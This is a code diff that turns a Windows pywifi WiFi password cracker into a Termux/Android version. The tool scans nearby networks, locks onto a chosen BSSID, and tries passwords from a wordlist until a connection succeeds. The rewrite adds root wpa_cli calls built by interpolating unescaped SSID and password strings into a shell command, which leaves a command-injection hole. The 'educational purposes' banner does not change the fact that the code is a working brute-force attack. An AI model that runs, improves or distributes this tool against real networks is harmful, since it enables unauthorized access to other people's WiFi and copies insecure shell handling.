@@ -1,205 +1,301 @@
-import pywifi
-from pywifi import const
+#!/usr/bin/env python3
+"""
+WiFi Scanner for Termux (Android)
+Requires: termux-api package and Termux:API app
+
+Setup in Termux:
+    pkg update && pkg upgrade
+    pkg install python termux-api
+    pip install colorama
+    
+Also install "Termux:API" app from F-Droid or Play Store
+"""
+
+import subprocess
+import json
 import time
 import os
-from colorama import Fore, Back, Style, init
+import sys
+from colorama import Fore, Style, init
 
-# Initialize colorama for Windows
 init(autoreset=True)
 
-def get_wifi_interface():
-    """Get the first WiFi interface"""
-    wifi = pywifi.PyWiFi()
-    iface = wifi.interfaces()[0]
-    return iface
+def check_termux_api():
+    """Check if termux-api is available"""
+    try:
+        result = subprocess.run(['which', 'termux-wifi-scaninfo'], 
+                              capture_output=True, text=True, timeout=5)
+        if result.returncode != 0:
+            print(f"{Fore.RED}[-] termux-api not found!")
+            print(f"{Fore.YELLOW}[!] Install with: pkg install termux-api")
+            print(f"{Fore.YELLOW}[!] Also install 'Termux:API' app from F-Droid")
+            return False
+        return True
+    except Exception as e:
+        print(f"{Fore.RED}[-] Error checking termux-api: {e}")
+        return False
 
-def scan_networks(iface):
-    """Scan for available networks"""
-    iface.scan()
-    time.sleep(3)
-    return iface.scan_results()
+def scan_networks():
+    """Scan for WiFi networks using termux-api"""
+    print(f"{Fore.YELLOW}[*] Scanning for networks (this may take a few seconds)...")
+    try:
+        result = subprocess.run(['termux-wifi-scaninfo'], 
+                              capture_output=True, text=True, timeout=30)
+        if result.returncode != 0:
+            print(f"{Fore.RED}[-] Scan failed: {result.stderr}")
+            return []
+        
+        networks = json.loads(result.stdout)
+        return networks
+    except json.JSONDecodeError:
+        print(f"{Fore.RED}[-] Failed to parse scan results")
+        return []
+    except subprocess.TimeoutExpired:
+        print(f"{Fore.RED}[-] Scan timed out")
+        return []
+    except Exception as e:
+        print(f"{Fore.RED}[-] Scan error: {e}")
+        return []
 
-def display_available_networks(iface):
-    """Display all available networks"""
-    networks = scan_networks(iface)
-    print(f"\n{Fore.GREEN}[+] Found {Fore.YELLOW}{len(networks)}{Fore.GREEN} networks:")
-    print(f"{Fore.CYAN}{'━' * 90}")
-    for i, network in enumerate(networks, 1):
-        auth_type = "WPA2" if network.akm and network.akm[0] == const.AKM_TYPE_WPA2PSK else "WPA" if network.akm and network.akm[0] == const.AKM_TYPE_WPAPSK else "Open"
-        print(f"{Fore.WHITE}{i}. {Fore.GREEN}SSID: {Fore.YELLOW}{network.ssid:20} {Fore.CYAN}| BSSID: {Fore.MAGENTA}{network.bssid} {Fore.CYAN}| Signal: {Fore.WHITE}{network.signal} {Fore.CYAN}| Auth: {Fore.RED}{auth_type}")
-    print(f"{Fore.CYAN}{'━' * 90}")
-    return networks
-
-def get_network_details(bssid, networks):
-    """Get details of a specific network by BSSID"""
-    # Normalize BSSID format
-    bssid_normalized = bssid.lower().replace("-", ":").strip()
-    
-    for network in networks:
-        network_bssid = network.bssid.lower().replace("-", ":").strip()
-        if network_bssid == bssid_normalized:
-            print(f"\n{Fore.GREEN + Style.BRIGHT}[+] Target Network Locked!")
-            print(f"{Fore.CYAN}    ├─ SSID: {Fore.YELLOW}{network.ssid}")
-            print(f"{Fore.CYAN}    ├─ BSSID: {Fore.MAGENTA}{network.bssid}")
-            print(f"{Fore.CYAN}    ├─ Signal: {Fore.WHITE}{network.signal}")
-            print(f"{Fore.CYAN}    ├─ Frequency: {Fore.WHITE}{network.freq}")
-            auth_type = "WPA2" if network.akm and network.akm[0] == const.AKM_TYPE_WPA2PSK else "WPA" if network.akm and network.akm[0] == const.AKM_TYPE_WPAPSK else "Open"
-            print(f"{Fore.CYAN}    └─ Auth Type: {Fore.RED}{auth_type}")
-            return network
+def get_wifi_connection_info():
+    """Get current WiFi connection info"""
+    try:
+        result = subprocess.run(['termux-wifi-connectioninfo'], 
+                              capture_output=True, text=True, timeout=10)
+        if result.returncode == 0:
+            return json.loads(result.stdout)
+    except:
+        pass
     return None
 
-def try_connect(iface, network, password):
-    """Try to connect with a given password - OPTIMIZED FOR SPEED"""
-    iface.disconnect()
-    time.sleep(0.1)  # Reduced from 0.5
+
+def display_networks(networks):
+    """Display all available networks"""
+    if not networks:
+        print(f"{Fore.RED}[-] No networks found!")
+        return []
     
-    profile = pywifi.Profile()
-    profile.ssid = network.ssid
-    profile.bssid = network.bssid
-    profile.auth = const.AUTH_ALG_OPEN
-    profile.akm.append(const.AKM_TYPE_WPA2PSK)
-    profile.cipher = const.CIPHER_TYPE_CCMP
-    profile.key = password
+    print(f"\n{Fore.GREEN}[+] Found {Fore.YELLOW}{len(networks)}{Fore.GREEN} networks:")
+    print(f"{Fore.CYAN}{'━' * 80}")
     
-    iface.remove_all_network_profiles()
-    tmp_profile = iface.add_network_profile(profile)
-    iface.connect(tmp_profile)
+    for i, net in enumerate(networks, 1):
+        ssid = net.get('ssid', 'Hidden')
+        bssid = net.get('bssid', 'Unknown')
+        level = net.get('rssi', net.get('level', 'N/A'))
+        freq = net.get('frequency_mhz', net.get('frequency', 'N/A'))
+        caps = net.get('capabilities', '')
+        
+        # Determine security type
+        if 'WPA3' in caps:
+            auth = 'WPA3'
+        elif 'WPA2' in caps:
+            auth = 'WPA2'
+        elif 'WPA' in caps:
+            auth = 'WPA'
+        elif 'WEP' in caps:
+            auth = 'WEP'
+        else:
+            auth = 'Open'
+        
+        print(f"{Fore.WHITE}{i:2}. {Fore.GREEN}SSID: {Fore.YELLOW}{ssid:25} "
+              f"{Fore.CYAN}| BSSID: {Fore.MAGENTA}{bssid} "
+              f"{Fore.CYAN}| Signal: {Fore.WHITE}{level:4} dBm "
+              f"{Fore.CYAN}| {Fore.RED}{auth}")
     
-    # Faster check with multiple attempts
-    for _ in range(15):  # Check 15 times over 1.5 seconds instead of waiting 3 seconds
-        time.sleep(0.1)
-        status = iface.status()
-        if status == const.IFACE_CONNECTED:
+    print(f"{Fore.CYAN}{'━' * 80}")
+    return networks
+
+def get_network_by_bssid(bssid, networks):
+    """Find network by BSSID"""
+    bssid_normalized = bssid.lower().strip()
+    for net in networks:
+        net_bssid = net.get('bssid', '').lower().strip()
+        if net_bssid == bssid_normalized:
+            return net
+    return None
+
+def try_connect_wifi(ssid, password):
+    """
+    Try to connect to WiFi using termux-wifi-enable and wpa_supplicant
+    Note: This requires root access on most Android devices
+    """
+    try:
+        # Method 1: Using termux-wifi-enable (limited functionality)
+        result = subprocess.run(['termux-wifi-enable', 'true'], 
+                              capture_output=True, text=True, timeout=5)
+        
+        # For actual connection, we need root or use Android intents
+        # This is a limitation of Android's security model
+        return False
+    except Exception as e:
+        return False
+
+def try_connect_root(ssid, password):
+    """
+    Try to connect using root commands (requires rooted device)
+    """
+    try:
+        # Create wpa_supplicant config
+        config = f'''
+network={{
+    ssid="{ssid}"
+    psk="{password}"
+    key_mgmt=WPA-PSK
+}}
+'''
+        # This requires root access
+        cmd = f'su -c "wpa_cli -i wlan0 add_network && wpa_cli -i wlan0 set_network 0 ssid \\\"{ssid}\\\" && wpa_cli -i wlan0 set_network 0 psk \\\"{password}\\\" && wpa_cli -i wlan0 enable_network 0 && wpa_cli -i wlan0 reconnect"'
+        
+        result = subprocess.run(['su', '-c', 
+            f'wpa_cli -i wlan0 remove_network 0 2>/dev/null; '
+            f'wpa_cli -i wlan0 add_network && '
+            f'wpa_cli -i wlan0 set_network 0 ssid \'"{ssid}"\' && '
+            f'wpa_cli -i wlan0 set_network 0 psk \'"{password}"\' && '
+            f'wpa_cli -i wlan0 enable_network 0 && '
+            f'wpa_cli -i wlan0 reconnect'],
+            capture_output=True, text=True, timeout=10, shell=True)
+        
+        time.sleep(3)
+        
+        # Check connection
+        info = get_wifi_connection_info()
+        if info and info.get('ssid') == ssid:
             return True
-        elif status == const.IFACE_DISCONNECTED:
-            # Failed quickly, no need to wait
-            return False
-    
-    return False
+        return False
+    except Exception as e:
+        return False
+
 
 def print_banner():
-    """Display hacker-themed banner"""
+    """Display banner"""
     banner = f"""
 {Fore.GREEN + Style.BRIGHT}
-╦ ╦╦╔═╗╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗
-║║║║╠╣ ║  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝
-╚╩╝╩╚  ╩  ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═
+╦ ╦╦╔═╗╦  ╔═╗╔═╗╔═╗╔╗╔╔╗╔╔═╗╦═╗
+║║║║╠╣ ║  ╚═╗║  ╠═╣║║║║║║║╣ ╠╦╝
+╚╩╝╩╚  ╩  ╚═╝╚═╝╩ ╩╝╚╝╝╚╝╚═╝╩╚═
 {Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-{Fore.RED + Style.BRIGHT}
- ██████╗██████╗ ███████╗ █████╗ ████████╗███████╗██████╗     ██████╗ ██╗   ██╗
-██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝
-██║     ██████╔╝█████╗  ███████║   ██║   █████╗  ██║  ██║    ██████╔╝ ╚████╔╝ 
-██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝  
-╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗██████╔╝    ██████╔╝   ██║   
- ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝     ╚═════╝    ╚═╝   
-
-{Fore.YELLOW + Style.BRIGHT}
-███████╗ █████╗ ██╗███╗   ██╗    ██╗    ██╗ █████╗ ██████╗ ██████╗ ██╗ ██████╗ ██████╗ 
-╚══███╔╝██╔══██╗██║████╗  ██║    ██║    ██║██╔══██╗██╔══██╗██╔══██╗██║██╔═══██╗██╔══██╗
-  ███╔╝ ███████║██║██╔██╗ ██║    ██║ █╗ ██║███████║██████╔╝██████╔╝██║██║   ██║██████╔╝
- ███╔╝  ██╔══██║██║██║╚██╗██║    ██║███╗██║██╔══██║██╔══██╗██╔══██╗██║██║   ██║██╔══██╗
-███████╗██║  ██║██║██║ ╚████║    ╚███╔███╔╝██║  ██║██║  ██║██║  ██║██║╚██████╔╝██║  ██║
-╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═╝
-
-{Fore.MAGENTA + Style.BRIGHT}
- ██████╗  █████╗ ███╗   ███╗███████╗██████╗ 
-██╔════╝ ██╔══██╗████╗ ████║██╔════╝██╔══██╗
-██║  ███╗███████║██╔████╔██║█████╗  ██████╔╝
-██║   ██║██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗
-╚██████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║  ██║
- ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
-
-{Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{Fore.GREEN + Style.BRIGHT}[*] WiFi Penetration Testing Tool
-{Fore.YELLOW}[*] For Educational Purposes Only
-{Fore.RED}[!] Use Responsibly - Unauthorized Access is Illegal
+{Fore.YELLOW}[*] Termux WiFi Scanner - Android Edition
+{Fore.GREEN}[*] For Educational Purposes Only
+{Fore.RED}[!] Unauthorized Access is Illegal
 {Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {Style.RESET_ALL}
 """
     print(banner)
 
+def check_root():
+    """Check if device is rooted"""
+    try:
+        result = subprocess.run(['su', '-c', 'id'], 
+                              capture_output=True, text=True, timeout=5)
+        return 'uid=0' in result.stdout
+    except:
+        return False
+
 def main():
     print_banner()
     
-    # Get WiFi interface
-    try:
-        iface = get_wifi_interface()
-        print(f"{Fore.GREEN}[+] Using interface: {Fore.CYAN}{iface.name()}")
-    except Exception as e:
-        print(f"{Fore.RED}[-] Error getting WiFi interface: {e}")
+    # Check termux-api
+    if not check_termux_api():
         return
     
-    # Scan and display all networks
-    print(f"\n{Fore.YELLOW}[*] Scanning for networks...")
-    networks = display_available_networks(iface)
+    # Check root status
+    is_rooted = check_root()
+    if is_rooted:
+        print(f"{Fore.GREEN}[+] Root access detected!")
+    else:
+        print(f"{Fore.YELLOW}[!] No root access - connection attempts will be limited")
+        print(f"{Fore.YELLOW}[!] You can still scan networks and test passwords offline")
+    
+    # Scan networks
+    networks = scan_networks()
+    networks = display_networks(networks)
     
     if not networks:
-        print(f"{Fore.RED}[-] No networks found!")
         return
     
-    # Get BSSID from user
-    bssid = input(f"\n{Fore.CYAN}[?] Enter the BSSID (MAC address) of the WiFi network: {Fore.WHITE}").strip()
+    # Show current connection
+    current = get_wifi_connection_info()
+    if current and current.get('ssid'):
+        print(f"\n{Fore.GREEN}[+] Currently connected to: {Fore.YELLOW}{current.get('ssid')}")
     
-    # Get network details
-    network = get_network_details(bssid, networks)
+    # Menu
+    print(f"\n{Fore.CYAN}[?] Options:")
+    print(f"    {Fore.WHITE}1. Scan networks again")
+    print(f"    {Fore.WHITE}2. Get network details by BSSID")
+    print(f"    {Fore.WHITE}3. Test passwords from wordlist {'(requires root)' if not is_rooted else ''}")
+    print(f"    {Fore.WHITE}4. Exit")
     
-    if not network:
-        print(f"{Fore.RED}[-] Network with BSSID {bssid} not found in scan results!")
-        print(f"{Fore.YELLOW}[!] Make sure the BSSID is correct and the network is in range.")
-        return
-    
-    # Get wordlist path
-    wordlist_path = input(f"\n{Fore.CYAN}[?] Enter the path to wordlist.txt: {Fore.WHITE}").strip()
-    
-    # Remove quotes if user copied path with quotes
-    wordlist_path = wordlist_path.strip('"').strip("'")
-    
-    # Try to find the file
-    if not os.path.exists(wordlist_path):
-        # Try in current directory
-        if os.path.exists(os.path.join(os.getcwd(), wordlist_path)):
-            wordlist_path = os.path.join(os.getcwd(), wordlist_path)
-        # Try just the filename
-        elif os.path.exists(os.path.basename(wordlist_path)):
-            wordlist_path = os.path.basename(wordlist_path)
-        else:
-            print(f"{Fore.RED}[-] Wordlist file not found: {wordlist_path}")
-            print(f"{Fore.YELLOW}[!] Current directory: {os.getcwd()}")
-            print(f"{Fore.YELLOW}[!] Make sure the file exists or provide full path")
-            return
-    
-    # Read passwords from wordlist
-    try:
-        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
-            passwords = [line.strip() for line in f if line.strip()]
-    except Exception as e:
-        print(f"{Fore.RED}[-] Error reading wordlist: {e}")
-        return
-    
-    print(f"\n{Fore.GREEN}[+] Loaded {Fore.YELLOW}{len(passwords)}{Fore.GREEN} passwords from wordlist")
-    print(f"{Fore.YELLOW}[*] Starting password attempts...")
-    print(f"{Fore.MAGENTA}[*] TURBO MODE ACTIVATED - Maximum Speed! 🚀\n")
-    
-    start_time = time.time()
-    
-    # Try each password
-    for i, password in enumerate(passwords, 1):
-        elapsed = time.time() - start_time
-        speed = i / elapsed if elapsed > 0 else 0
-        print(f"{Fore.CYAN}[{i}/{len(passwords)}] {Fore.WHITE}Trying: {Fore.YELLOW}{password:20} {Fore.GREEN}| Speed: {speed:.1f} pwd/s        ", end='\r')
+    while True:
+        choice = input(f"\n{Fore.CYAN}[?] Select option (1-4): {Fore.WHITE}").strip()
         
-        if try_connect(iface, network, password):
-            print(f"\n\n{Fore.GREEN + Style.BRIGHT}{'=' * 60}")
-            print(f"{Fore.GREEN}╔═══════════════════════════════════════════════════════════╗")
-            print(f"{Fore.GREEN}║  {Fore.YELLOW + Style.BRIGHT}★ ★ ★  SUCCESS! PASSWORD CRACKED!  ★ ★ ★{Fore.GREEN}           ║")
-            print(f"{Fore.GREEN}╚═══════════════════════════════════════════════════════════╝")
-            print(f"{Fore.WHITE}Password: {Fore.RED + Style.BRIGHT}{password}")
-            print(f"{Fore.GREEN}{'=' * 60}{Style.RESET_ALL}\n")
-            return
-    
-    print(f"\n\n{Fore.RED}[-] Password not found in wordlist")
-    iface.disconnect()
+        if choice == '1':
+            networks = scan_networks()
+            networks = display_networks(networks)
+        
+        elif choice == '2':
+            bssid = input(f"{Fore.CYAN}[?] Enter BSSID: {Fore.WHITE}").strip()
+            net = get_network_by_bssid(bssid, networks)
+            if net:
+                print(f"\n{Fore.GREEN}[+] Network Details:")
+                print(f"    {Fore.CYAN}├─ SSID: {Fore.YELLOW}{net.get('ssid', 'Hidden')}")
+                print(f"    {Fore.CYAN}├─ BSSID: {Fore.MAGENTA}{net.get('bssid')}")
+                print(f"    {Fore.CYAN}├─ Signal: {Fore.WHITE}{net.get('rssi', net.get('level', 'N/A'))} dBm")
+                print(f"    {Fore.CYAN}├─ Frequency: {Fore.WHITE}{net.get('frequency_mhz', net.get('frequency', 'N/A'))} MHz")
+                print(f"    {Fore.CYAN}└─ Capabilities: {Fore.RED}{net.get('capabilities', 'N/A')}")
+            else:
+                print(f"{Fore.RED}[-] Network not found!")
+        
+        elif choice == '3':
+            if not is_rooted:
+                print(f"{Fore.RED}[-] Root access required for connection attempts!")
+                print(f"{Fore.YELLOW}[!] On non-rooted devices, Android restricts WiFi connections")
+                continue
+            
+            bssid = input(f"{Fore.CYAN}[?] Enter target BSSID: {Fore.WHITE}").strip()
+            net = get_network_by_bssid(bssid, networks)
+            
+            if not net:
+                print(f"{Fore.RED}[-] Network not found!")
+                continue
+            
+            ssid = net.get('ssid')
+            if not ssid:
+                print(f"{Fore.RED}[-] Cannot connect to hidden network!")
+                continue
+            
+            wordlist = input(f"{Fore.CYAN}[?] Enter wordlist path: {Fore.WHITE}").strip().strip('"\'')
+            
+            if not os.path.exists(wordlist):
+                print(f"{Fore.RED}[-] Wordlist not found: {wordlist}")
+                continue
+            
+            try:
+                with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
+                    passwords = [line.strip() for line in f if line.strip()]
+            except Exception as e:
+                print(f"{Fore.RED}[-] Error reading wordlist: {e}")
+                continue
+            
+            print(f"\n{Fore.GREEN}[+] Loaded {len(passwords)} passwords")
+            print(f"{Fore.YELLOW}[*] Testing against: {ssid}")
+            
+            for i, pwd in enumerate(passwords, 1):
+                print(f"{Fore.CYAN}[{i}/{len(passwords)}] {Fore.WHITE}Trying: {Fore.YELLOW}{pwd:20}", end='\r')
+                
+                if try_connect_root(ssid, pwd):
+                    print(f"\n\n{Fore.GREEN}{'=' * 50}")
+                    print(f"{Fore.GREEN}[+] SUCCESS! Password found: {Fore.RED}{pwd}")
+                    print(f"{Fore.GREEN}{'=' * 50}\n")
+                    break
+            else:
+                print(f"\n{Fore.RED}[-] Password not found in wordlist")
+        
+        elif choice == '4':
+            print(f"{Fore.GREEN}[+] Goodbye!")
+            break
+        
+        else:
+            print(f"{Fore.RED}[-] Invalid option!")
 
 if __name__ == "__main__":
     main()
